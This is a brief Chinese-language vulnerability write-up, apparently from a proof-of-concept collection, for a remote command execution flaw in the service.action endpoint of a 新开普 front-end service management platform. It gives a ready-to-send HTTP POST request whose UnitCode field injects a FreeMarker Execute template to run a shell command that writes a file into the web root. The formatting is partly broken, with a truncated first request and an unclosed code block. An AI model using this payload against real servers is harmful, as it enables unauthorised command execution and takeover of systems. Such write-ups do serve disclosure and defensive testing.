# 新开普 前置服务管理平台 service.action 远程命令执行漏洞

## 漏洞描述
新开普 前置服务管理平台 service.action 接口存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限

## 危害等级
CRITICAL

## 参考链接

## 漏洞复现方法
登陆页面

![image-20230828112934396](images/image-20230828112934396.png)

验证POC

```
POST /service_transport/service.action HTTP/1.1
Host: 
Accept: */*

## Payloads
```
POST /service_transport/service.action HTTP/1.1
Host: 
Accept: */*
Content-Type: application/json

{"command":"GetFZinfo","UnitCode":"<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd /c echo Test > ./webapps/ROOT/Test.txt\")}"}
```
